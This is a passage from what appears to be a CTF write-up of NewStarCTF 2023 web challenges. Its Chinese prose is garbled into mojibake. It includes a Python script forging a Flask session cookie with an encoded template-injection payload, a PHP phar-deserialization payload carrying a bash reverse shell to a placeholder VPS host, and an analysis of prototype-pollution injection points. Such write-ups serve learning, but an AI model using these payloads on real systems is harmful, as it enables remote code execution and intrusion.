        <span class="hljs-comment">#è¿™é‡Œå››ä¸ªåæ–œæ æ˜¯ä¸ºäº†è½¬ä¹‰æœ€ç»ˆæˆåŠŸä¸¤ä¸ªåæ–œæ ,</span>
        octal_ascii += <span class="hljs-string">"\\\\"</span> + <span class="hljs-built_in">format</span>(char_code, <span class="hljs-string">'03o'</span>)
    <span class="hljs-comment"># octal_ascii += "\\\\" + format(char_code, 'o')</span>
    <span class="hljs-comment">#print(octal_ascii)</span>
    <span class="hljs-keyword">return</span> octal_ascii


secret_key = <span class="hljs-string">"y0u_n3ver_k0nw_s3cret_key_1s_newst4r"</span>

<span class="hljs-comment"># payload = "{%print(7*7)%}"</span>
<span class="hljs-comment"># payload = "{%print(\"\"\\\\u005f\\\\u005f\"\")%}"</span>
<span class="hljs-comment"># payload = "{%print(\"\"\\\\x5f\\\\x5f\"\")%}"</span>

eval_shell = <span class="hljs-string">"\"\""</span> + string_to_octal_ascii(<span class="hljs-string">"__import__(\"os\").popen(\"cat /*\").read()"</span>) + <span class="hljs-string">"\"\""</span>
<span class="hljs-built_in">print</span>(eval_shell)
<span class="hljs-comment"># dockeréƒ¨ç½²&amp;windowsè¿è¡Œpayload</span>
<span class="hljs-comment"># {{x.__init__.__globals__.__builtins__.eval('__import__("os").popen("dir").read()')}}</span>
payload = <span class="hljs-string">"{{%print(xxx|attr(\"\"\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\"\")|attr(\"\"\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\"\")(\"\"\\\\145\\\\166\\\\141\\\\154\"\")({0}))%}}"</span>.<span class="hljs-built_in">format</span>(eval_shell)
<span class="hljs-comment">#print(payload)</span>
command = <span class="hljs-string">"python3 flask_session_cookie_manager3.py encode -s \"{0}\" -t \"{{'user':'{1}'}}\""</span>.<span class="hljs-built_in">format</span>(secret_key,
                                                                                                     payload)
<span class="hljs-built_in">print</span>(command)

session_data = subprocess.check_output(command, shell=<span class="hljs-literal">True</span>) <span class="hljs-comment">#é€šè¿‡æ“ä½œç³»ç»Ÿçš„shellæ‰§è¡ŒæŒ‡å®šå‘½ä»¤,è¿™é‡Œå‘¢å°±æ˜¯sessionä¼ªé€ äº†</span>
<span class="hljs-built_in">print</span>(session_data)
<span class="hljs-comment"># linuxå’Œwindowsæ¢è¡Œä¸ä¸€æ ·ï¼Œlinuxæ˜¯å»æ‰æœ€åä¸€ä¸ªï¼Œwindowsæ˜¯æœ€åä¸¤ä¸ªã€‚</span>
<span class="hljs-comment"># è¿™é‡Œæ˜¯ç”±äºä¸Šè¿°subprocesså‡½æ•°æ˜¯ä»¥å­—èŠ‚æµè¿”å›ç»“æœçš„,é‚£å¦‚æœå…¶ä¸­æœ‰æ¢è¡Œç¬¦çš„è¯,æˆ‘ä»¬å°±éœ€è¦å»æ‰äº†</span>
session_data = session_data[:-<span class="hljs-number">2</span>].decode(<span class="hljs-string">'utf-8'</span>)<span class="hljs-comment"># å°†å­—èŠ‚æµç»“æœä»¥utf-8ç¼–ç çš„æ–¹å¼è§£ç </span>
<span class="hljs-comment"># session_data = session_data[:-1].decode('utf-8')</span>
<span class="hljs-built_in">print</span>(session_data)

url = <span class="hljs-string">"http://5c5893f4-8c26-4236-9534-e1da7bebc239.node4.buuoj.cn:81/backdoor"</span>
cookies = {<span class="hljs-string">"session"</span>: session_data}
res = requests.get(url=url, cookies=cookies)
<span class="hljs-comment"># print(res.text)</span>

pattern = <span class="hljs-string">r'&lt;h1&gt;(.*)&lt;/h1&gt;'</span>
result_content = re.search(pattern, res.text, re.S)
<span class="hljs-comment"># print(result_content)</span>
<span class="hljs-keyword">if</span> result_content:

    result = result_content.group(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(result)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"something wrong!"</span>)</code></pre>
<p>![image-20231107221951803](NewStarCTF 2023/image-20231107221951803.png)</p>
<p>æˆåŠŸæ‹¿åˆ°flagï¼Œæ¥ä¸‹æ¥å°±æ˜¯çœ‹æ‡‚è„šæœ¬å¹¶å°è¯•ç¼–å†™äº†ã€‚ã€‚ã€‚ã€‚</p>
<h2 id="week4web-pharone">WEEK4|WEB-PharOne</h2>
<p>![image-20231108205750064](NewStarCTF 2023/image-20231108205750064.png)</p>
<p>è®¿é—®é¦–é¡µçœ‹åˆ°æ˜¯æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œå…ˆä¹ æƒ¯æ€§çš„çœ‹ä¸€ä¸‹æºä»£ç </p>
<p>![image-20231108205812922](NewStarCTF 2023/image-20231108205812922.png)</p>
<p>å‘ç°å¯ä»¥è®¿é—®class.php</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);
    }
}
@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'file'</span>]);</code></pre>
<p>é‡Œé¢å†…å®¹å¦‚ä¸‹ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œä¼¼ä¹æ˜¯è¦è¿›è¡Œååºåˆ—åŒ–çš„ï¼Œä½†å‡ºäººæ„æ–™çš„æ˜¯æ²¡æœ‰unserializeå‡½æ•°ï¼Œä½†å´æœ‰ä¸€ä¸ªunlinkå‡½æ•°ï¼Œè¿™é‡Œè‚¯å®šæ˜¯æ¼æ´ç‚¹äº†ã€‚ä½†æˆ‘ä»¬ä¸æ¸…æ¥šåŸç†çš„ï¼Œäºæ˜¯æˆ‘ç»“åˆé¢˜æ„è¿›è¡Œå…³é”®è¯çš„æœç´¢ï¼š<code>phar unlink æ–‡ä»¶ä¸Šä¼ </code>ä¹‹åå‘ç°è¿™é“é¢˜å°±æ˜¯pharååºåˆ—åŒ–ï¼Œå­¦äº†ä¸€æ³¢ä¹‹åæ¥å°è¯•ä¸€ä¸‹ã€‚</p>
<p>ç›´æ¥ä¸Špopï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//ini_set("phar.readonly", 0);</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;
}
@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">"phar.phar"</span>);
<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"GIF89a"</span>.<span class="hljs-string">"&lt;?php __HALT_COMPILER();?&gt;"</span>); <span class="hljs-comment">//è®¾ç½®stub</span>
<span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();
<span class="hljs-variable">$o</span>-&gt;cmd = <span class="hljs-string">'bash -c "bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1"'</span>;
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>
<span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>è¿™é‡Œæˆ‘ç›´æ¥è¿è¡Œä¹‹åå°†pharçš„åç¼€æ”¹ä¸ºgifï¼šå› ä¸ºçŒœæµ‹é¢˜ç›®è‚¯å®šä¼šè¿‡æ»¤pharå…³é”®å­—ï¼Œä½†æ²¡è¿‡æ»¤ä¹Ÿæ˜¯æ²¡å…³ç³»çš„ï¼Œä¸€ç•ªä¸‡ä¸€å˜›ï¼Œéšåä¸Šä¼ phar.gifä¹‹åå‘ç°å¦‚ä¸‹</p>
<p>![image-20231108214428320](NewStarCTF 2023/image-20231108214428320.png)</p>
<p>tmæŠŠ<code>__HALT_COMPILER</code>ä¹Ÿè¿‡æ»¤äº†ã€‚ã€‚ã€‚æ²¡åŠæ³•ï¼Œè‚¯å®šè¦ç»§ç»­ç»•è¿‡ï¼Œéšåç»§ç»­å…³é”®å­—æœç´¢ï¼Œå‘ç°éœ€è¦gzipå‹ç¼©æ¥ç»•è¿‡ï¼Œä½†è¿™é‡Œæˆ‘ä¸çŸ¥é“å’‹ç”¨gzipå‘½ä»¤ã€‚ã€‚ã€‚äºæ˜¯çœ‹äº†ä¸€çœ¼wpï¼ˆç‹—å¤´ï¼Œå•Šï¼åŸæ¥æ˜¯<code>system("gzip phar.phar");</code>å³å¯ï¼Œæœå˜</p>
<p>ä¸è¿‡è¿™é‡Œæˆ‘æ˜¯åœ¨phpstormä¸Šè¿è¡Œçš„ï¼Œæ•…æ­¤gzipå‘½ä»¤è¿˜å¾—å®‰è£…ä¸€ä¸‹ï¼Œmadå°±è¿™ç©æ„å„¿åˆåºŸäº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼Œå®‰è£…å¯å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yuxisanno139/article/details/83016520">https://blog.csdn.net/yuxisanno139/article/details/83016520</a></p>
<p>æœ€åå®‰è£…å®Œï¼Œåœ¨é…ç½®å¥½ç¯å¢ƒå˜é‡å°±èƒ½ç”¨</p>
<p>![image-20231108220844914](NewStarCTF 2023/image-20231108220844914.png)</p>
<p>è™½ç„¶è¿è¡Œå®Œè¿™é‡Œè¿˜ä¼šæç¤ºé”™è¯¯ï¼Œä½†ä¼¼ä¹å¯ä»¥å¿½ç•¥ï¼Œå› ä¸ºæ–‡ä»¶è¿˜æ˜¯å¯ä»¥æ­£å¸¸ç”Ÿæˆçš„ã€‚æœ€ç»ˆpayloadå¦‚ä¸‹</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//ini_set("phar.readonly", 0);</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;
}
@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">"phar.phar"</span>);
<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//åç¼€åå¿…é¡»ä¸ºphar</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"&lt;?php __HALT_COMPILER();?&gt;"</span>); <span class="hljs-comment">//è®¾ç½®stub</span>
<span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();
<span class="hljs-variable">$o</span>-&gt;cmd = <span class="hljs-string">'bash -c "bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1"'</span>;
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>
<span class="hljs-comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">"gzip phar.phar"</span>);
<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">"phar.phar.gz"</span>, <span class="hljs-string">"2.jpg"</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>è¿™é‡Œé‡å‘½åæ˜¯å› ä¸ºåç¼€çš„é™åˆ¶ï¼Œè¿™ä¹Ÿæ˜¯æµ‹è¯•å‡ºæ¥çš„ï¼Œè™½ç„¶pharååºåˆ—åŒ–ä¹‹å‰äº†è§£è¿‡ï¼Œä½†ä»è¿™æ¬¡åšé¢˜æˆ‘æ„Ÿè§‰å‡ºæ¥è¿˜æ˜¯å¾ˆåƒåœ¾ï¼Œå› æ­¤ä¹‹åä¼šåœ¨å¼€ä¸€ç¯‡æ–‡ç« å­¦ä¹ ä¸€ä¸‹ã€‚</p>
<p>è¿™é‡Œé‡‡ç”¨bashå‘½ä»¤åå¼¹æ˜¯å› ä¸ºé¢˜ç›®çš„å‘½ä»¤å‡½æ•°æ˜¯execï¼Œç»“æœä¸å›æ˜¾ï¼Œå› æ­¤éœ€è¦åå¼¹ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾å¾—åˆ°flag</p>
<p>![image-20231108220534992](NewStarCTF 2023/image-20231108220534992.png)</p>
<p>æœ€åå¾—åˆ°çš„2.jpgä¸Šä¼ åæ ¹æ®ä¸Šä¼ ç›®å½•ï¼Œç”¨pharåè®®è¯»å–ï¼ˆå¼€å¯ååºåˆ—åŒ–ï¼‰ä¸€ä¸‹å°±å¯åå¼¹æˆåŠŸäº†ï¼Œå‚è€ƒæ–‡ç« åœ¨ä¸‹é¢</p>
<pre><code class="hljs php">file=phar:<span class="hljs-comment">//upload/156005c5baf40ff51a327f1c34f2975b.jpg</span></code></pre>
<h2 id="week4web-otenkiboy">WEEK4|WEB-OtenkiBoy</h2>
<p>è¿™é“é¢˜ç›®å°±æ˜¯week3çš„å‡çº§ç‰ˆäº†ï¼Œä¾æ—§æ˜¯åœ¨ç»™çš„é™„ä»¶ä¸­å®¡è®¡ä»£ç </p>
<p>çœ‹åˆ°<code>routes/submit.js</code></p>
<p>![image-20231108222639307](NewStarCTF 2023/image-20231108222639307.png)</p>
<p>çœ‹åˆ°è¿™é‡Œå¯ä»¥ï¼Œè¿½è¸ªä¸€ä¸‹mergejsonå‡½æ•°ï¼Œè¿›å…¥åˆ°<code>routes/_components/utils.js</code></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> mergeJSON = <span class="hljs-keyword">function</span> (<span class="hljs-params">target, patch, deep = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> patch !== <span class="hljs-string">"object"</span>) <span class="hljs-keyword">return</span> patch;<span class="hljs-comment">// åˆ¤æ–­patchæ˜¯å¦æ˜¯å¯¹è±¡</span>
    <span class="hljs-comment">//å¦‚æœ patch æ˜¯æ•°ç»„ï¼Œç›´æ¥è¿”å› patchã€‚è¿™æ˜¯å› ä¸ºæ•°ç»„åœ¨ JavaScript ä¸­ä¹Ÿè¢«è§†ä¸ºå¯¹è±¡ï¼Œä½†åœ¨åˆå¹¶æ—¶ä¸éœ€è¦é€’å½’å¤„ç†ã€‚</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(patch)) <span class="hljs-keyword">return</span> patch; <span class="hljs-comment">// do not recurse into arrays</span>
    <span class="hljs-keyword">if</span> (!target) target = {}<span class="hljs-comment">// åˆ¤æ–­targetæ˜¯å¦ä¸ºç©º</span>
    <span class="hljs-comment">//å¦‚æœè®¾ç½®äº†æ·±åº¦åˆå¹¶ (deep === true)ï¼Œåˆ™åˆ†åˆ«å¯¹ target å’Œ patch è¿›è¡Œæ·±æ‹·è´ã€‚</span>
    <span class="hljs-keyword">if</span> (deep) { target = <span class="hljs-title function_">copyJSON</span>(target), patch = <span class="hljs-title function_">copyJSON</span>(patch); }
    <span class="hljs-comment">//å¾ªç¯éå† patch ä¸­çš„æ¯ä¸ªå±æ€§ã€‚</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> patch) {
        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">"__proto__"</span>) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">// è¿‡æ»¤äº†__proto__å…³é”®è¯</span>
        <span class="hljs-comment">//å¦‚æœ target å’Œ patch ä¸­çš„ç›¸åº”å±æ€§å€¼ä¸ç›¸ç­‰ï¼Œé€’å½’è°ƒç”¨ mergeJSON æ¥åˆå¹¶å®ƒä»¬ã€‚</span>
        <span class="hljs-keyword">if</span> (target[key] !== patch[key])
            target[key] = <span class="hljs-title function_">mergeJSON</span>(target[key], patch[key]);
    }
    <span class="hljs-keyword">return</span> target;
}</code></pre>
<p>ä½†è¿™é‡Œè¿‡æ»¤äº†<code>__proto__</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>constructor.prototype</code>å»ä»£æ›¿<code>__proto__</code>è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p>
<p>æ¥ä¸‹æ¥æ˜¯å¯»æ‰¾æ³¨å…¥ç‚¹ï¼ŒæŸ¥çœ‹<code>routes/info.js</code></p>
<pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) {
    <span class="hljs-comment">//æ£€æŸ¥ä¼ å…¥çš„timestampæ—¶é—´æˆ³æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¦åˆ™èµ‹å€¼ä¸ºå½“å‰æ—¶é—´æˆ³</span>
    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">"number"</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-comment">// Remove test data from before the movie was released</span>
    <span class="hljs-keyword">let</span> minTimestamp;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">//è·å–min_publicçš„æ—¶é—´æˆ³</span>
        minTimestamp = <span class="hljs-title function_">createDate</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();
        <span class="hljs-comment">//æ£€æŸ¥ minTimestamp æ˜¯å¦ä¸ºå®‰å…¨æ•´æ•°ï¼ˆNumber.isSafeIntegerï¼‰ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™æŠ›å‡ºé”™è¯¯ã€‚</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isSafeInteger</span>(minTimestamp)) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Invalid configuration min_public_time."</span>);
    } <span class="hljs-keyword">catch</span> (e) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`\x1b[33m<span class="hljs-subst">${e.message}</span>\x1b[0m`</span>);
        <span class="hljs-comment">//å°è¯•ä½¿ç”¨é»˜è®¤å€¼ DEFAULT_CONFIG.min_public_time é‡æ–°è®¡ç®— minTimestampã€‚</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`Try using default value <span class="hljs-subst">${DEFAULT_CONFIG.min_public_time}</span>.`</span>);
        minTimestamp = <span class="hljs-title function_">createDate</span>(<span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>, { <span class="hljs-attr">UTC</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">baseDate</span>: <span class="hljs-title class_">LauchTime</span> }).<span class="hljs-title function_">getTime</span>();
    }
    <span class="hljs-comment">//å°† timestamp æ›´æ–°ä¸ºä¼ å…¥çš„ timestamp å’Œ minTimestamp ä¸­è¾ƒå¤§çš„ä¸€ä¸ªã€‚è¿™ç¡®ä¿äº† timestamp è‡³å°‘æ˜¯ minTimestampã€‚</span>
    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);
    <span class="hljs-comment">//ä»åä¸º wishes çš„è¡¨ä¸­é€‰æ‹©æ»¡è¶³æ¡ä»¶ timestamp &gt;= ? çš„æ‰€æœ‰æ•°æ®ï¼Œå…¶ä¸­ ? ç”±ä¼ å…¥çš„ timestamp å†³å®šã€‚</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> { <span class="hljs-keyword">throw</span> e });
    <span class="hljs-keyword">return</span> data;
}</code></pre>
<p><code>minTimestamp</code>å–è‡ªé…ç½®æ–‡ä»¶ï¼Œåœ¨<code>Math.max</code>å¤„ä¸ºå¯æ§çš„<code>timestamp</code>è®¾ç½®ä¸‹é™å€¼ï¼Œæˆ‘ä»¬éœ€è¦å°†<code>minTimestamp</code>æ”¹å°æ¥è·å–æ›´æ—©çš„æ•°æ®åº“æ•°æ®</p>
<p>è¿½è¸ª<code>createDate</code>ï¼Œåœ¨<code>routes/_components/utils.js</code>ä¸­</p>
<p>å­˜åœ¨å‡ ä¸ªæ³¨å…¥ç‚¹</p>
<p><strong>opts æ³¨å…¥ç‚¹</strong></p>
<pre><code class="hljs json">const DEFAULT_CREATE_DATE_OPTIONS = <span class="hljs-punctuation">{</span>
    UTC<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
    format<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"yyyy-MM-dd HH:mm:ss.fff"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"yyyy-MM-dd"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"MM/dd/yyyy"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"MM/dd/yyyy HH:mm:ss"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"MM/dd/yyyy HH:mm:ss.fff"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"MM/dd/yy HH:mm:ss"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"HH:mm:ss"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"HH:mm:ss.fff"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-comment">// baseDate: undefined</span>
<span class="hljs-punctuation">}</span></code></pre>
<pre><code class="hljs json"><span class="hljs-comment">//é€šè¿‡è°ƒç”¨ copyJSON å‡½æ•°å¤åˆ¶äº†ä¸€ä¸ªé»˜è®¤çš„æ—¥æœŸé…ç½®å¯¹è±¡ </span>
const CopiedDefaultOptions = copyJSON(DEFAULT_CREATE_DATE_OPTIONS)
if (typeof opts === <span class="hljs-string">"undefined"</span>) opts = CopiedDefaultOptions<span class="hljs-comment">//å¦‚æœæœªæä¾›é…ç½®é¡¹ optsï¼Œåˆ™å°†å…¶è®¾ä¸ºé»˜è®¤é…ç½®çš„å‰¯æœ¬ã€‚</span>
<span class="hljs-comment">//å¦‚æœæä¾›äº† opts ä½†ä¸æ˜¯å¯¹è±¡ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶è®¾ç½® UTC å±æ€§ä¸º opts çš„å¸ƒå°”å€¼ã€‚</span>
if (typeof opts !== <span class="hljs-string">"object"</span>) opts = <span class="hljs-punctuation">{</span> ...CopiedDefaultOptions<span class="hljs-punctuation">,</span> UTC<span class="hljs-punctuation">:</span> Boolean(opts) <span class="hljs-punctuation">}</span>;
opts.UTC = typeof opts.UTC === <span class="hljs-string">"undefined"</span> ? CopiedDefaultOptions.UTC <span class="hljs-punctuation">:</span> Boolean(opts.UTC);
opts.format = opts.format || CopiedDefaultOptions.format;
if (!Array.isArray(opts.format)) opts.format = <span class="hljs-punctuation">[</span>opts.format<span class="hljs-punctuation">]</span><span class="hljs-comment">//å¦‚æœæ ¼å¼ä¸æ˜¯æ•°ç»„ï¼Œå°†å…¶è½¬æ¢ä¸ºæ•°ç»„ã€‚</span>
<span class="hljs-comment">//é€šè¿‡ filter å‡½æ•°ï¼Œä¿ç•™ opts.format ä¸­ç±»å‹ä¸ºå­—ç¬¦ä¸²çš„é¡¹ï¼Œè¿‡æ»¤æ‰éå­—ç¬¦ä¸²ç±»å‹çš„é¡¹ï¼Œç¡®ä¿äº†æ•°ç»„ä¸­åªåŒ…å«å­—ç¬¦ä¸²ç±»å‹çš„æ—¥æœŸæ ¼å¼ã€‚</span>
opts.format = opts.format.filter(f =&gt; typeof f === <span class="hljs-string">"string"</span>)
  .filter(f =&gt; <span class="hljs-punctuation">{</span>
      <span class="hljs-comment">// åˆ¤æ–­fæ˜¯å¦åŒ…å«æœ‰æ•ˆçš„æ—¥æœŸæ ¼å¼ç¬¦å·ï¼ˆä¹Ÿå°±æ˜¯è¦åŒ…å«ä¸‹åˆ—ç¬¦å·çš„è‡³å°‘ä¸€ä¸ªï¼‰</span>
    if (/yy|yyyy|MM|dd|HH|mm|ss|fff/.test(f) === <span class="hljs-literal"><span class="hljs-keyword">false</span></span>) <span class="hljs-punctuation">{</span>
      console.warn(`Invalid format <span class="hljs-string">"${f}"</span>.`<span class="hljs-punctuation">,</span> `At least one format specifier is required.`);
      return <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;
    <span class="hljs-punctuation">}</span>
    <span class="hljs-comment">//é€šè¿‡æ›¿æ¢æ“ä½œå°† yyyy è½¬æ¢ä¸º yyï¼Œç„¶åä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åˆ†å‰²å­—ç¬¦ä¸²ï¼Œæ£€æŸ¥å„ä¸ªæ—¥æœŸæ ¼å¼ç¬¦å·ä¹‹é—´æ˜¯å¦å­˜åœ¨åˆ†éš”ç¬¦ã€‚</span>
    if (`|$<span class="hljs-punctuation">{</span>f<span class="hljs-punctuation">}</span>|`.replace(/yyyy/g<span class="hljs-punctuation">,</span> <span class="hljs-string">"yy"</span>).split(/yy|MM|dd|HH|mm|ss|fff/).includes(<span class="hljs-string">""</span>)) <span class="hljs-punctuation">{</span>
      console.warn(`Invalid format <span class="hljs-string">"${f}"</span>.`<span class="hljs-punctuation">,</span> `Delimeters are required between format specifiers.`);
      return <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;
    <span class="hljs-punctuation">}</span>
      <span class="hljs-comment">//å¦‚æœæ—¥æœŸæ ¼å¼ä¸­åŒæ—¶åŒ…å« yyyy å’Œ yyï¼Œè¾“å‡ºè­¦å‘Šä¿¡æ¯</span>
    if (f.includes(<span class="hljs-string">"yyyy"</span>) &amp;&amp; f.replace(/yyyy/g<span class="hljs-punctuation">,</span> <span class="hljs-string">""</span>).includes(<span class="hljs-string">"yy"</span>)) <span class="hljs-punctuation">{</span>
      console.warn(`Invalid format <span class="hljs-string">"${f}"</span>.`<span class="hljs-punctuation">,</span> `<span class="hljs-string">"yyyy"</span> and <span class="hljs-string">"yy"</span> cannot be used together.`);
      return <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;
    <span class="hljs-punctuation">}</span>
    return <span class="hljs-literal"><span class="hljs-keyword">true</span></span>;
  <span class="hljs-punctuation">}</span>)
<span class="hljs-comment">//å¦‚æœæœªæä¾›åŸºå‡†æ—¥æœŸ (opts.baseDate)ï¼Œåˆ™å°†å…¶è®¾ç½®ä¸ºå½“å‰æ—¶é—´æˆ³ã€‚è¿™ä¸€æ­¥ç¡®ä¿äº†åœ¨åˆ›å»ºæ—¥æœŸå¯¹è±¡æ—¶æœ‰ä¸€ä¸ªåˆé€‚çš„åŸºå‡†æ—¥æœŸã€‚</span>
opts.baseDate = new Date(opts.baseDate || Date.now());</code></pre>
